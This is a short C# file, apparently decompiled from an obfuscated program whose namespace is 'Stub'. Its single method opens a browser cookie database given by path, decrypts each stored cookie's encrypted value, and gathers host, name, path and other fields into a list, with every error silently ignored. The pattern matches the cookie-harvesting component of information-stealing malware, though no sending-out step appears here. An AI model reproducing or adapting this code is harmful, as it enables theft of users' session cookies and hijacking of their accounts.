using System;
using System.Collections.Generic;

namespace Stub
{
	// Token: 0x02000014 RID: 20
	public sealed class Class20
	{
		// Token: 0x06000037 RID: 55 RVA: 0x00003864 File Offset: 0x00001A64
		public static List<Struct5> smethod_0(string String_0)
		{
			List<Struct5> list = new List<Struct5>();
			List<Struct5> result;
			try
			{
				Class27 @class = Class28.smethod_0(String_0, "cookies");
				if (@class == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < @class.method_1(); i++)
					{
						Struct5 item = default(Struct5);
						item.String_5 = Class2.smethod_4(String_0, @class.method_0(i, 12));
						if (item.String_5 == "")
						{
							item.String_5 = @class.method_0(i, 3);
						}
						item.String_0 = Class2.smethod_2(@class.method_0(i, 1));
						item.String_1 = Class2.smethod_2(@class.method_0(i, 2));
						item.String_2 = Class2.smethod_2(@class.method_0(i, 4));
						item.String_3 = Class2.smethod_2(@class.method_0(i, 5));
						item.String_6 = Class2.smethod_2(@class.method_0(i, 6).ToUpper());
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = list;
			}
			return result;
		}
	}
}
